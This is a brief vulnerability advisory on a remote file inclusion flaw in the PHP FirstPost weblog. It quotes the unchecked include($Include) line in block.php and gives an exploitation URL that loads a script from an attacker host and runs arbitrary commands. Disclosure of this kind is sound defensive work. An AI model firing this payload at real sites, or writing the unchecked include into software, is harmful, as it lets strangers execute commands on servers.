[Description]:

PHP FirstPost is yet another PHP weblog. This one, however, is based
on Scoop, and has the open submission queue and comment rating system.

A vulnerability exists in PHP FirstPost, which could allow any remote
user to include a php script for execute arbitrary commands on the
target system.

[Details]:

The problem exists is in the file "block.php" when includes the
variable $Include

<?php if($Include) { include($Include); }; ?>

[Exploitation example]:

http://[target]/path_to_script/block.php?Include=http://[attacker]/cmd.gif?&cmd=|command|
